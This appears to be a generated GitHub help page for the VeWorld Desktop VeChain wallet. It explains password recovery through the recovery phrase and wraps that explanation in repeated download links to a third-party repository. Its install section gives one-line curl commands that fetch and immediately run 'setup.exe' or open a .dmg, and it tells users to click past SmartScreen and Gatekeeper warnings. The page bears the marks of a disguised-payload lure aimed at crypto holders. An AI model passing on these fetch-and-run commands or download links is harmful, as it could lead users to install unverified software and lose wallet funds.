![VeWorld Desktop](../assets/banner-article.png)

# Forgot VeChain Wallet Password? What VeWorld Desktop Can Recover

Only the recovery phrase restores access

## Downloads - v2.2.4

<p align="center"><a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe"><img src="../assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg"><img src="../assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip"><img src="../assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="../assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`VeWorld-desktop-wallet-win-v2.2.4.exe`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe) |
| <img src="../assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`VeWorld-desktop-wallet-macos-v2.2.4.dmg`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg) |
| <img src="../assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`VeWorld-desktop-wallet-linux-v2.2.4.zip`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip) |

Download the [current VeWorld Desktop release](https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4) for Windows, macOS and Linux.

> VeWorld Desktop is actively maintained; run the current release before treating a display problem as a wallet fault.

A forgotten wallet password is recovered with the recovery phrase, not with a reset. There is no reset link, no security question and no support route, because the password only decrypts data stored on your own machine. VeWorld Desktop restores the address from the phrase and then lets you set a fresh password.

<!-- ARTICLE-BODY-BEGIN -->

## You'll see this if

The app asks for a password you cannot remember, or it rejected a password you were certain about. Panic usually follows, along with a search for a reset form that does not exist for this class of wallet.

| What you have | What you can do | What you cannot do |
|---|---|---|
| Written recovery phrase | Restore the wallet now | Nothing is lost |
| Phrase only in memory, wallet still open somewhere | Recover the phrase from that device first | Recover it later |
| No phrase, no open device | No route back | No support reset exists |
| A <a href="https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/pair-a-vechain-ledger-with-veworld-desktop.md">Ledger device</a> holding the keys | Reconnect the device | The device PIN is the gate |

## Why it happens

The password is not an authentication credential in the usual sense. It derives a key that decrypts the wallet file on your disk, which is why it can work with no network connection and why nobody can issue a new one from outside. A server that could reset it would, by definition, hold a way into your keys.

That design leaves exactly one recovery route: the phrase. Restoring is not the same as unlocking. Unlocking decrypts existing material; restoring rebuilds the material from the words and produces the same address from scratch. A restored wallet has no memory of the old password, which is why it asks for a new one.

Attempts to remember rarely help because the failure is usually not memory. Caps lock, a keyboard layout that moves punctuation, a password typed with a trailing space, or a password that was changed on another installation all present as "forgot". Trying a handful of variants is reasonable; after that, restoring is faster and safer than a hundred guesses. A restore is also the only step that leaves the account in a state you can inspect: the address reappears with its balances, and nothing about the old installation has to be repaired for the new one to work. What a restore cannot do is open a keystore file whose phrase was never written down, which is why the two backups are worth keeping separately.

There is also a category of person who never had a password to forget: an imported account with a keystore file uses that file's own password, which was set elsewhere. If the keystore password is gone and the phrase exists, the phrase is the route. If neither exists, the account cannot be opened by anyone, and no amount of reinstalling changes that.

## Fix

1. Stop guessing and check the variants first: caps lock, keyboard layout, trailing space, and any recent password change on another device.
2. Locate the written recovery phrase. Look where a phrase would physically be, not in a notes app.
3. Open the app's restore option and choose the phrase import.
4. Enter the words in order, then set a new local password and store it in a password manager.
5. Confirm the derived address matches the one that holds the funds before doing anything else.
6. Write the phrase down again if the only copy is somewhere you would not trust after a house move or a device failure.

## If that did not work

If the phrase is rejected, recount the words and check spelling against the written copy. One incorrect word in the middle fails validation outright, and a word that looks similar to another in the list is a common culprit.

If the phrase is accepted but lands on an empty address, the import used a different <a href="https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/check-vechain-balance-zero-in-veworld-desktop.md">derivation path</a>. Retry with the custom path option; an account created outside the default path will not appear at the default one.

If the wallet file and the phrase are both unavailable, nothing further can be done from the software side. A wallet with no backup is a balance nobody can move, which is why the phrase is written down during setup rather than afterwards.

## Prevention

- Write the phrase down the day the wallet is created, before any balance arrives.
- Store it physically, separately from the machine, and never in a photograph or a cloud note.
- Never enter the recovery phrase into a website, a chat or a support form, and never share it with anyone, whoever appears to be asking.
- Use a password manager for the local password so it is not dependent on memory.
- Test a restore on a second machine once, while everything is fresh, so the phrase is known to work.

VeWorld Desktop is actively maintained, and the current release can be downloaded from the <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4">VeWorld Desktop releases page</a>.

## FAQ

### Can support reset my password?

No. Nobody holds a copy of the encrypted wallet, so there is nothing to reset. This is a property of self-custody rather than a policy choice.

### Is my balance lost if I forget the password?

Not if the recovery phrase exists. Restoring reproduces the address and the balance with it, and the old password becomes irrelevant.

### What if I forgot the password and never wrote the phrase down?

Then the account can only be reached through a device that still has it open. There is no other route, and reinstalling will not help.

### Does restoring change my address?

No. The address is derived from the phrase, so a restore produces the same one. A different address means a different phrase or a different derivation path.

### Should I change the password after restoring?

Yes, and store it somewhere recoverable. The restored wallet starts with a new local password, and the phrase remains the backup of last resort.

<!-- ARTICLE-BODY-END -->

## How to install VeWorld Desktop

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe">VeWorld-desktop-wallet-win-v2.2.4.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg">VeWorld-desktop-wallet-macos-v2.2.4.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
<!-- BLOCKED: the Linux release asset is a .zip with no verified extraction or launch facts,
     so no command is generated. The verified manual steps are kept below. -->
Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-linux-v2.2.4.zip">VeWorld-desktop-wallet-linux-v2.2.4.zip</a>.
2. Unzip the archive.
3. Run the application inside it.
<!-- INSTALL-END -->

## Related guides

- [How the password and phrase differ](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/veworld-login-password-and-phrase-veworld-desktop.md)
- [When an update blocks the unlock screen](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/vechain-wallet-password-pin-screen-veworld-desktop.md)
- [How self-custody protects and exposes you](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/is-veworld-wallet-safe-in-veworld-desktop.md)
- [When a restored account reads zero](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/check-vechain-balance-zero-in-veworld-desktop.md)
- [What a fresh install looks like before it is restored](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/create-vechain-wallet-blank-in-veworld-desktop.md)